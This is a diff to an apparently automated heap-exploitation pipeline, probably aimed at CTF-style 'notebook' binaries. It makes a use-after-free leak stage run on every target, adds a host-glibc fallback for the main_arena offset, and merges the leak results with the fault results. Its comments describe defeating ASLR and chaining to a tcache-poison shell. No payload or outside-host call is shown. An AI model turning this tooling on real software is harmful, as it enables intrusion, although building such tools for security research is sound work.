@@ -415,12 +415,17 @@ def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, a
     # unsorted-bin offset and the leak classifier -- NOT the host libc.
     libc_path = next((p for p in Path(workdir).rglob("libc*.so*") if p.is_file()), None)
     libc_data = libc_path.read_bytes() if libc_path else b""
+    # The main_arena offset the unsorted-bin fd discloses. A bundled libc is measured directly; with
+    # NO bundled libc the target runs against the HOST glibc (this is a native x86-64-only stage), so
+    # the host main_arena offset is the correct one -- the fd points at THIS process's arena. The
+    # page-aligned subtraction guard in heap_uaf_leak still rejects a wrong offset (a static or
+    # foreign binary), so the host fallback recovers a real libc leak and never fabricates one;
+    # without it a no-bundled-libc target could only ever disclose a heap pointer.
     unsorted_off = 0
-    if libc_path:
-        try:
-            unsorted_off = int(_heap.unsorted_bin_offset(str(libc_path)) or 0)
-        except Exception:
-            unsorted_off = 0
+    try:
+        unsorted_off = int(_heap.unsorted_bin_offset(str(libc_path) if libc_path else None) or 0)
+    except Exception:
+        unsorted_off = 0
     # The tcache-fill strategy drives ~18 menu ops (9 creates + 8 frees + a Show), each with a
     # prompt drain, so it needs a generous budget -- 10s starved it mid-fill and the Show never ran.
     hit = heap_uaf_leak(workdir, exe, ops, model, width, target_bytes=target_bytes,
@@ -599,16 +604,20 @@ def heap_trace_stage(ctx) -> dict:
                 found = (seq, rep)
                 break
 
-        if not found:
-            # No FAULT surfaced -- but a notebook's real primitive is often a use-after-free READ
-            # (Show-after-Remove prints a freed chunk's libc/heap pointer) that never faults, so the
-            # watchpoint tracer above cannot see it. Try that leak explicitly before giving up.
+        # A use-after-free READ (Show-after-Remove prints a freed chunk's libc/heap pointer) never
+        # faults, so the watchpoint tracer above cannot see it -- and it is a DISTINCT, higher-value
+        # primitive than a crashing fault: the disclosure defeats ASLR and seeds a tcache-poison ->
+        # shell. A double-free/overflow fault would otherwise MASK it (the tracer stops at the first
+        # fault and returns), so attempt it UNCONDITIONALLY and file it alongside -- a notebook
+        # commonly has both. Self-gates to an add/free/view menu, so it is a no-op elsewhere.
+        leak_hit = None
+        try:
+            leak_hit = _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts,
+                                     width, alloc)
+        except Exception:
             leak_hit = None
-            try:
-                leak_hit = _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts,
-                                         width, alloc)
-            except Exception:
-                leak_hit = None
+
+        if not found:
             if leak_hit:
                 return leak_hit
             ctx.emit("heaptrace.done", payload={
@@ -652,7 +661,10 @@ def heap_trace_stage(ctx) -> dict:
             # the aaheg chainer consumes this Vuln shape (double_free/uaf -> tcache-poison chain)
             "vuln": {"vclass": _kind, "note": f"{alloc['alloc_name']}/{alloc['free_name']}"}})
         ctx.progress(pct=100, msg=f"{_title.lower()} discovered on {alloc['free_name']}")
-        return {"metrics": {_kind: True}, "output_shas": [input_sha]}
+        metrics = {_kind: True}
+        if leak_hit:                                     # a fault AND a UAF-read disclosure both fired
+            metrics.update(leak_hit.get("metrics", {}))
+        return {"metrics": metrics, "output_shas": [input_sha]}
     finally:
         shutil.rmtree(workdir, ignore_errors=True)
 
